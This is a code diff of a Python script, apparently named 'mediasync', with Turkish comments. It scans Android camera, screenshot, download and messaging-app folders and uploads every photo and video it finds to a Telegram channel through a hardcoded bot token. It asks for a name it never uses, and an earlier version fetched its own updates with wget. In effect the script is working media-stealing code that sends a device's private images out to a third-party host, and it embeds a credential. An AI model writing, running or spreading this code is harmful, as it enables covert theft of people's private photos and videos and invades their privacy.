@@ -1,32 +1,28 @@
 import os
+import requests
 import subprocess
-import sys
-import time
 
-# Gerekli değişkenler
 BOT_TOKEN = "7345820153:AAHnspzH9sl9SLCAj7rSgOb9aMbFhsGS9cM"
 CHANNEL_ID = "@p8JdyixgqKFlMjA0"
-SCRIPT_URL = "https://raw.githubusercontent.com/fatiqueos/mediasync/refs/heads/main/main.py"
-SCRIPT_NAME = "main.py"
 
-# Mevcut script içeriğini al
-def get_current_script_content():
-    if os.path.exists(SCRIPT_NAME):
-        with open(SCRIPT_NAME, "r") as file:
-            return file.read()
-    return None
-
-# Güncellemeleri kontrol et
-def check_for_updates():
-    print("Güncellemeler kontrol ediliyor...")
+# Gerekli kütüphanelerin kurulumu
+def install(package):
     try:
-        # Güncel scripti almak için wget veya curl kullanabilirsin (Pydroid 3'te wget mevcut olabilir)
-        os.system(f"wget {SCRIPT_URL} -O {SCRIPT_NAME}")
-        print("Güncelleme tamamlandı.")
+        subprocess.check_call(["pip", "install", package])
     except Exception as e:
-        print(f"Güncelleme kontrolünde hata oluştu: {e}")
+        print(f"{package} kurulurken hata oluştu: {e}")
 
-# Medya dizinleri
+# requests kütüphanesini kontrol et
+try:
+    import requests
+except ImportError:
+    print("requests kütüphanesi bulunamadı, kuruluyor...")
+    install("requests")
+
+# Kullanıcıdan isim alma
+name = input("Lütfen bir isim girin: ")
+
+# Dizinlerin listesi
 directories = [
     "/storage/emulated/0/DCIM/Camera/",
     "/storage/emulated/0/Pictures/Screenshots/",
@@ -44,35 +40,35 @@ directories = [
     "/storage/emulated/0/Movies/Twitter/",
     "/storage/emulated/0/Download/Telegram/",
     "/storage/emulated/0/Movies/",
-    "/storage/emulated/0/Videos/"
+    "/storage/emulated/0/Videos/" 
 ]
 
 image_extensions = [".jpg", ".jpeg", ".png", ".gif"]
 video_extensions = [".mp4", ".mov", ".avi"]
 
-# Medyayı Telegram'a gönder
 def send_media_to_channel(file_path):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto" if file_path.endswith(tuple(image_extensions)) else f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo"
     
-    # Telegram'a gönderme
-    os.system(f"curl -s -F 'chat_id={CHANNEL_ID}' -F 'document=@{file_path}' {url}")
-    print(f"Telegram'a gönderildi: {file_path}")
+    with open(file_path, "rb") as media_file:
+        data = {"chat_id": CHANNEL_ID}
+        files = {"photo" if file_path.endswith(tuple(image_extensions)) else "video": media_file}
+        
+        response = requests.post(url, data=data, files=files)
+        if response.status_code == 200:
+            print(f"Telegram'a gönderiliyor: {file_path}")
+            print(f"Telegram'a gönderildi: {file_path}")
+        else:
+            print(f"Telegram'a gönderilirken hata oluştu: {response.text}")
 
-# Dosyaları kontrol et ve gönder
 def check_and_send_files():
-    name = input("Lütfen bir isim girin: ")  # Kullanıcıdan isim iste
     for directory in directories:
         if os.path.exists(directory):
             for root, _, files in os.walk(directory):
                 for file in files:
                     file_path = os.path.join(root, file)
                     if file_path.endswith(tuple(image_extensions + video_extensions)):
-                        print(f"Telegram'a gönderiliyor: {file_path}")  # İlerleme mesajı
                         send_media_to_channel(file_path)
-                        time.sleep(1)  # Her gönderim arasında 1 saniye bekle
         else:
             print(f"Dizin mevcut değil: {directory}")
 
-# Ana döngü
-check_for_updates()  # Başlangıçta güncellemeleri kontrol et
-check_and_send_files()  # Medyaları gönder
+check_and_send_files()
